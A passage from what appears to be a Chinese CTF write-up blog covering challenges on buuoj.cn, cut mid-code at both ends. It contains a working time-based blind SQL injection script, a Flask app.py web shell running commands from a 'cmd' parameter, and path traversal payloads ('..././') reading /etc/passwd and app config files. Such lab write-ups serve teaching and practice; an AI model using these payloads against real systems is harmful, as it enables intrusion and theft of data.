string-interpolation\"><span class=\"token string\">f\"((</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>length<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">)in(</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>i<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">))\"</span></span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>        <span class=\"token keyword\">return</span> s1</pre></td></tr><tr><td data-num=\"63\"></td><td><pre></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">ascii_greater</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> asc<span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>        s1 <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"(leAst(</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>asc<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">,</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>i<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">)in(</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>i<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">))\"</span></span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>        <span class=\"token keyword\">return</span> s1</pre></td></tr><tr><td data-num=\"67\"></td><td><pre></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">judge</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> cond<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>        s2 <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"Elt((</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>cond<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">)+1,sLeep(1),0)\"</span></span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>        s1 <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"(iF((</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>cond<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">),sLeep(1),0))\"</span></span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>        <span class=\"token keyword\">return</span> s1</pre></td></tr><tr><td data-num=\"72\"></td><td><pre></pre></td></tr><tr><td data-num=\"73\"></td><td><pre></pre></td></tr><tr><td data-num=\"74\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Injector</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> url<span class=\"token punctuation\">,</span> method<span class=\"token punctuation\">,</span> inject_param<span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span> debug<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>        self<span class=\"token punctuation\">.</span>url <span class=\"token operator\">=</span> url</pre></td></tr><tr><td data-num=\"77\"></td><td><pre>        self<span class=\"token punctuation\">.</span>method <span class=\"token operator\">=</span> method</pre></td></tr><tr><td data-num=\"78\"></td><td><pre>        self<span class=\"token punctuation\">.</span>data <span class=\"token operator\">=</span> data</pre></td></tr><tr><td data-num=\"79\"></td><td><pre>        self<span class=\"token punctuation\">.</span>inject_param <span class=\"token operator\">=</span> inject_param</pre></td></tr><tr><td data-num=\"80\"></td><td><pre>        self<span class=\"token punctuation\">.</span>debug <span class=\"token operator\">=</span> debug</pre></td></tr><tr><td data-num=\"81\"></td><td><pre>        self<span class=\"token punctuation\">.</span>gadget <span class=\"token operator\">=</span> Gadget<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">condition</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> res<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>        <span class=\"token keyword\">if</span> res<span class=\"token punctuation\">.</span>elapsed<span class=\"token punctuation\">.</span>total_seconds<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">handle_value</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> function<span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>args<span class=\"token punctuation\">,</span> <span class=\"token operator\">**</span>kwargs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>        result <span class=\"token operator\">=</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>        data <span class=\"token operator\">=</span> copy<span class=\"token punctuation\">.</span>deepcopy<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>        <span class=\"token keyword\">for</span> _time <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">200</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"time:%d\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>_time <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>            left <span class=\"token operator\">=</span> <span class=\"token number\">32</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>            right <span class=\"token operator\">=</span> <span class=\"token number\">128</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>            updated <span class=\"token operator\">=</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>            <span class=\"token keyword\">while</span> right <span class=\"token operator\">></span> left<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>                mid <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>left <span class=\"token operator\">+</span> right<span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>                <span class=\"token keyword\">with</span> self<span class=\"token punctuation\">.</span>gadget <span class=\"token keyword\">as</span> g<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>                    data<span class=\"token punctuation\">[</span>self<span class=\"token punctuation\">.</span>inject_param<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">[</span>self<span class=\"token punctuation\">.</span>inject_param<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">'XXXXX'</span><span class=\"token punctuation\">,</span> g<span class=\"token punctuation\">.</span>judge<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>                        g<span class=\"token punctuation\">.</span>ascii_equal<span class=\"token punctuation\">(</span>g<span class=\"token punctuation\">.</span>get_char_ascii<span class=\"token punctuation\">(</span>function<span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>args<span class=\"token punctuation\">,</span> <span class=\"token operator\">**</span>kwargs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> _time <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> mid<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>                res <span class=\"token operator\">=</span> <span class=\"token boolean\">None</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>                <span class=\"token keyword\">if</span> self<span class=\"token punctuation\">.</span>method <span class=\"token operator\">==</span> <span class=\"token string\">'get'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>                    res <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>url<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>                    <span class=\"token keyword\">if</span> self<span class=\"token punctuation\">.</span>debug<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>                        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">.</span>request<span class=\"token punctuation\">.</span>url<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>                        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>                <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>                    res <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>url<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>                    <span class=\"token keyword\">if</span> self<span class=\"token punctuation\">.</span>debug<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>                        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>                <span class=\"token keyword\">if</span> self<span class=\"token punctuation\">.</span>condition<span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>                    result <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>mid<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>                    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>                    updated <span class=\"token operator\">=</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>                    <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>                <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>                    <span class=\"token keyword\">with</span> self<span class=\"token punctuation\">.</span>gadget <span class=\"token keyword\">as</span> g<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre>                        data<span class=\"token punctuation\">[</span>self<span class=\"token punctuation\">.</span>inject_param<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">[</span>self<span class=\"token punctuation\">.</span>inject_param<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">'XXXXX'</span><span class=\"token punctuation\">,</span> g<span class=\"token punctuation\">.</span>judge<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre>                            g<span class=\"token punctuation\">.</span>ascii_greater<span class=\"token punctuation\">(</span>g<span class=\"token punctuation\">.</span>get_char_ascii<span class=\"token punctuation\">(</span>function<span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>args<span class=\"token punctuation\">,</span> <span class=\"token operator\">**</span>kwargs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> _time <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> mid<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre>                res <span class=\"token operator\">=</span> <span class=\"token boolean\">None</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre>                <span class=\"token keyword\">if</span> self<span class=\"token punctuation\">.</span>method <span class=\"token operator\">==</span> <span class=\"token string\">'get'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre>                    res <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>url<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"123\"></td><td><pre>                <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre>                    res <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>url<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"125\"></td><td><pre>                <span class=\"token keyword\">if</span> self<span class=\"token punctuation\">.</span>debug<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"126\"></td><td><pre>                    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre>                <span class=\"token keyword\">if</span> self<span class=\"token punctuation\">.</span>condition<span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"128\"></td><td><pre>                    left <span class=\"token operator\">=</span> mid</pre></td></tr><tr><td data-num=\"129\"></td><td><pre>                <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre>                    right <span class=\"token operator\">=</span> mid</pre></td></tr><tr><td data-num=\"131\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> updated<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"132\"></td><td><pre>                <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"133\"></td><td><pre></pre></td></tr><tr><td data-num=\"134\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">handle_len</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> function<span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>args<span class=\"token punctuation\">,</span> <span class=\"token operator\">**</span>kwargs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"135\"></td><td><pre>        data <span class=\"token operator\">=</span> copy<span class=\"token punctuation\">.</span>deepcopy<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"136\"></td><td><pre>        <span class=\"token keyword\">for</span> _time <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">200</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"137\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"time:%d\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>_time<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"138\"></td><td><pre>            <span class=\"token keyword\">with</span> self<span class=\"token punctuation\">.</span>gadget <span class=\"token keyword\">as</span> g<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"139\"></td><td><pre>                data<span class=\"token punctuation\">[</span>self<span class=\"token punctuation\">.</span>inject_param<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">[</span>self<span class=\"token punctuation\">.</span>inject_param<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">'XXXXX'</span><span class=\"token punctuation\">,</span> g<span class=\"token punctuation\">.</span>judge<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"140\"></td><td><pre>                    g<span class=\"token punctuation\">.</span>len_equal<span class=\"token punctuation\">(</span>g<span class=\"token punctuation\">.</span>get_len<span class=\"token punctuation\">(</span>function<span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>args<span class=\"token punctuation\">,</span> <span class=\"token operator\">**</span>kwargs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> _time<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"141\"></td><td><pre>            res <span class=\"token operator\">=</span> <span class=\"token boolean\">None</span></pre></td></tr><tr><td data-num=\"142\"></td><td><pre>            <span class=\"token keyword\">if</span> self<span class=\"token punctuation\">.</span>method <span class=\"token operator\">==</span> <span class=\"token string\">'get'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"143\"></td><td><pre>                res <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>url<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"144\"></td><td><pre>                <span class=\"token keyword\">if</span> self<span class=\"token punctuation\">.</span>debug<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"145\"></td><td><pre>                    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">.</span>request<span class=\"token punctuation\">.</span>url<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"146\"></td><td><pre>                    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"147\"></td><td><pre>            <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"148\"></td><td><pre>                res <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>url<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"149\"></td><td><pre>                <span class=\"token keyword\">if</span> self<span class=\"token punctuation\">.</span>debug<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"150\"></td><td><pre>                    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"151\"></td><td><pre>            <span class=\"token keyword\">if</span> self<span class=\"token punctuation\">.</span>condition<span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"152\"></td><td><pre>                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>_time<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"153\"></td><td><pre>                <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"154\"></td><td><pre></pre></td></tr><tr><td data-num=\"155\"></td><td><pre></pre></td></tr><tr><td data-num=\"156\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"157\"></td><td><pre>    g <span class=\"token operator\">=</span> Gadget<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"158\"></td><td><pre>    result <span class=\"token operator\">=</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"159\"></td><td><pre>    url <span class=\"token operator\">=</span> <span class=\"token string\">'http://22efcf95-b1f0-43bb-ae25-a76d1371153b.node4.buuoj.cn:81/'</span></pre></td></tr><tr><td data-num=\"160\"></td><td><pre>    inject_param <span class=\"token operator\">=</span> <span class=\"token string\">'id'</span></pre></td></tr><tr><td data-num=\"161\"></td><td><pre>    data <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">'id'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"1/**/Or/**/XXXXX#\"</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"162\"></td><td><pre>    inj <span class=\"token operator\">=</span> Injector<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> method<span class=\"token operator\">=</span><span class=\"token string\">'get'</span><span class=\"token punctuation\">,</span> inject_param<span class=\"token operator\">=</span>inject_param<span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"163\"></td><td><pre></pre></td></tr><tr><td data-num=\"164\"></td><td><pre>    <span class=\"token comment\"># 获取数据库列表</span></pre></td></tr><tr><td data-num=\"165\"></td><td><pre>    <span class=\"token comment\"># inj.handle_value(g.db_names)</span></pre></td></tr><tr><td data-num=\"166\"></td><td><pre>    <span class=\"token comment\"># information_schema, mysql, performance_schema, sys, test, ctf</span></pre></td></tr><tr><td data-num=\"167\"></td><td><pre></pre></td></tr><tr><td data-num=\"168\"></td><td><pre>    <span class=\"token comment\"># 根据数据库获取表名</span></pre></td></tr><tr><td data-num=\"169\"></td><td><pre>    <span class=\"token comment\"># inj.handle_value(g.table_name_in_db2, 'ctf')</span></pre></td></tr><tr><td data-num=\"170\"></td><td><pre>    <span class=\"token comment\"># items</span></pre></td></tr><tr><td data-num=\"171\"></td><td><pre></pre></td></tr><tr><td data-num=\"172\"></td><td><pre>    <span class=\"token comment\"># 获取表的字段</span></pre></td></tr><tr><td data-num=\"173\"></td><td><pre>    <span class=\"token comment\"># inj.handle_value(g.column_name_in_table, 'items')</span></pre></td></tr><tr><td data-num=\"174\"></td><td><pre>    <span class=\"token comment\"># id, name, price</span></pre></td></tr><tr><td data-num=\"175\"></td><td><pre></pre></td></tr><tr><td data-num=\"176\"></td><td><pre>    <span class=\"token comment\"># 最后取数据</span></pre></td></tr><tr><td data-num=\"177\"></td><td><pre>    inj<span class=\"token punctuation\">.</span>handle_value<span class=\"token punctuation\">(</span>g<span class=\"token punctuation\">.</span>column_value_in_table<span class=\"token punctuation\">,</span> <span class=\"token string\">'ctf.items'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'name'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"flask-disk\"><a class=\"anchor\" href=\"#flask-disk\">#</a> flask disk</h3>\n<p>做之前可以看下这篇文章了解下 flask 的 debug 模式。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMTk3NjAy\">从一道 ctf 题谈谈 flask 开启 debug 模式存在的安全问题</span></p>\n<p>访问 admin manage 发现要输入 pin 码，说明 flask 开启了 debug 模式。</p>\n<p>flask 开启了 debug 模式下，app.py 源文件被修改后会立刻加载。</p>\n<p>所以只需要上传一个能 rce 的 app.py 文件把原来的覆盖，就可以了。注意语法不能出错，否则会崩溃。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#app.py</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> flask <span class=\"token keyword\">import</span> Flask<span class=\"token punctuation\">,</span>request</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>app <span class=\"token operator\">=</span> Flask<span class=\"token punctuation\">(</span>__name__<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">index</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        cmd <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span>args<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'cmd'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        data <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>popen<span class=\"token punctuation\">(</span>cmd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">return</span> data</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">pass</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token string\">\"1\"</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">if</span> __name__<span class=\"token operator\">==</span><span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    app<span class=\"token punctuation\">.</span>run<span class=\"token punctuation\">(</span>host<span class=\"token operator\">=</span><span class=\"token string\">'0.0.0.0'</span><span class=\"token punctuation\">,</span>port<span class=\"token operator\">=</span><span class=\"token number\">5000</span><span class=\"token punctuation\">,</span>debug<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"injectme\"><a class=\"anchor\" href=\"#injectme\">#</a> InjectMe</h3>\n<p>目录穿越 + session 伪造 + SSTI bypass</p>\n<p>这题目我的评价是真不错。</p>\n<p>首先进入题目是一张图片，点击图片可进入 /cancanneed 目录，内容如下：</p>\n<p>['.DS_Store', '1.jpg', '10.jpg', '11.jpg', '110.jpg', '3.jpg', '4.jpg', '5.jpg', '6.jpg', '7.jpg', '8.jpg', '9.jpg']<br />\n<span class=\"exturl\" data-url=\"aHR0cDovLzk4MzcwOTQyLTEzMDYtNGFjNi1hNjc3LTMxYTM3NTQ3OTEyZC5ub2RlNC5idXVvai5jbjo4MS9jYW5jYW5uZWVkP2ZpbGU9MS5qcGc=\">/cancanneed?file=1.jpg</span></p>\n<p>点击 /cancanneed?file=1.jpg，进入后发现：<span class=\"exturl\" data-url=\"aHR0cDovLzk4MzcwOTQyLTEzMDYtNGFjNi1hNjc3LTMxYTM3NTQ3OTEyZC5ub2RlNC5idXVvai5jbjo4MS9kb3dubG9hZD9maWxlPTEuanBn\">download 1.jpg</span></p>\n<p>图片可以下载，观察到 url 变为了 /download?file=1.jpg</p>\n<p>很明显有敏感文件泄露，尝试一番后无果，应该是因为有过滤的原因，那就看看它给的其它图片里有啥，最终在 110.jpg 中看到提示：</p>\n<p><img data-src=\"../../../images/Iknowyouwillstop/110.jpg\" alt=\"110\" /></p>\n<p>可以看到对传递进来的 file 参数进行了../ 单次替换，然后拼接，最后下载文件，由于只进行了一次替换成空，所以可以绕过，下面提供一种方式，然后加上 dockerfile 泄露的目录，可以猜到运行文件，以及后面审计源码，发现 config 文件：</p>\n<blockquote>\n<p>..././..././..././etc/passwd</p>\n<p>..././..././..././app/app.py</p>\n<p>..././..././..././app/config.py</p>\n</blockquote>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#app.py</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> re</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">from</span> flask <span class=\"token keyword\">import</span> Flask<span class=\"token punctuation\">,</span> render_template<span class=\"token punctuation\">,</span> request<span class=\"token punctuation\">,</span> abort<span class=\"token punctuation\">,</span> send_file<span class=\"token punctuation\">,</span> session<span class=\"token punctuation\">,</span> 